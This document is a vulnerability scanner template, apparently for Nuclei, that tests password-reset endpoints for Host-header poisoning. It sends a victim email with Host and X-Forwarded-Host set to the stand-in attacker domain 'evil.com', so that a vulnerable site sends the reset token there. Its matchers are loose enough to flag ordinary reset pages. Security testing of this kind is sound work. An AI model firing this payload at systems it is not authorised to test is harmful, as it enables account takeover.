id: m7-host-header-password-reset
info:
  name: M7 - Host Header Password Reset Poisoning
  author: Sharlix
  severity: high
  description: Password reset token sent to attacker domain via Host header
  tags: host-header,password-reset,m7hunter
  reference:
    - https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning

requests:
  - method: POST
    path:
      - "{{BaseURL}}/forgot-password"
      - "{{BaseURL}}/reset-password"
      - "{{BaseURL}}/account/password/reset"
      - "{{BaseURL}}/auth/forgot"
      - "{{BaseURL}}/password/reset"

    body: "email=victim@target.com"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: "evil.com"
      X-Forwarded-Host: "evil.com"

    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
          - 302

      - type: word
        words:
          - "password reset"
          - "reset link"
          - "check your email"
        part: body
        condition: or
